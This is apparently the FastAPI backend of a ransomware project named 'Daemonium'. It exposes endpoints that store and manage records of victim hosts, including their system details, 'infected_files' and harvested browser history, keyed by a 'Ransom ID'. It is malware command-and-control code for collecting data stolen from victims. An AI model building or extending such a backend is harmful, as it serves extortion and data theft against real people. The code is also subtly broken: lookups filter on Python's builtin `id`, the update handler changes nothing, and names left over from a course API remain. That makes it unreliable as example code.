from typing import List, Any, Sequence
from fastapi import APIRouter, status, Depends, HTTPException, Response, Path
from sqlalchemy import Row, RowMapping
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from models import DaemoniumModel
from schemas import DaemoniumSchema
from core import get_session


router: APIRouter = APIRouter()


@router.post(
    path='/',
    status_code=status.HTTP_201_CREATED,
    response_model=DaemoniumSchema,
    description="Insert a host in the database",
    summary="Create a host"
)
async def post_course(
        rasomn: DaemoniumSchema,
        db: AsyncSession = Depends(get_session)  # dependencies injected
) -> DaemoniumSchema:
    new_course = DaemoniumModel(
        hostname=rasomn.hostname,
        system_release=rasomn.system_release,
        SO=rasomn.SO,
        disk=rasomn.disk,
        memory=rasomn.memory,
        cpu=rasomn.cpu,
        infected_files=rasomn.infected_files,
        history_browser=rasomn.history_browser,
    )
    db.add(new_course)
    await db.commit()
    return new_course


@router.get(
    path='/',
    status_code=status.HTTP_200_OK,
    response_model=List[DaemoniumSchema],
    description="Get all hosts from the database",
    summary="Get all host"
)
async def get_courses(db: AsyncSession = Depends(get_session)) -> Sequence[Row | RowMapping | Any]:
    async with db as session:
        response = await session.execute(select(DaemoniumModel))
        return response.scalars().all()


@router.get(
    path='/{rasomn_id}',
    status_code=status.HTTP_200_OK,
    response_model=DaemoniumSchema,
    description="Get a host from the database",
    summary="Get only one host"
)
async def get_course(
            rasomn_id: str = Path(
            title="host ID",
        ),
        db: AsyncSession = Depends(get_session),
) -> DaemoniumSchema:
    async with db as session:
        response = await session.execute(select(DaemoniumModel).filter(DaemoniumModel.id == id))
        response = response.scalar_one_or_none()
        if response:
            return response
        raise HTTPException(
            detail="host Not Found.",
            status_code=status.HTTP_404_NOT_FOUND
        )


@router.put(
    path='/{rasomn_id}',
    status_code=status.HTTP_202_ACCEPTED,
    response_model=DaemoniumSchema,
    description="Update a host information",
    summary="Update host")
async def put_course(
            rasomn: DaemoniumSchema,
            rasomn_id: str = Path(
            title="Ransom ID",
        ),
        db: AsyncSession = Depends(get_session),
) -> DaemoniumSchema:
    async with db as session:
        response = await session.execute(select(DaemoniumModel).filter(DaemoniumModel.id == id))
        response = response.scalar_one_or_none()
        if response:
            hostname: str = rasomn.hostname
            system_release: str = rasomn.system_release
            SO: str = rasomn.SO
            disk: str = rasomn.disk
            memory: str = rasomn.memory
            cpu: str = rasomn.cpu
            infected_files: str = rasomn.infected_files
            history_browser: str = rasomn.history_browser
            await session.commit()
            return response
        raise HTTPException(
            detail="host not exists.",
            status_code=status.HTTP_404_NOT_FOUND
        )


@router.delete(
    path='/{rasomn_id}',
    status_code=status.HTTP_204_NO_CONTENT,
    description="Delete a host from database",
    summary="Delete course")
async def delete_course(
            rasomn_id: str = Path(
            title="Ransom ID",
        ),
        db: AsyncSession = Depends(get_session),
) -> None:
    async with db as session:
        response = await session.execute(select(DaemoniumModel).filter(DaemoniumModel.id == id))
        response = response.scalar_one_or_none()
        if response:
            await session.delete(response)
            await session.commit()
            return None
        raise HTTPException(
            detail="host not exists.",
            status_code=status.HTTP_404_NOT_FOUND
        )
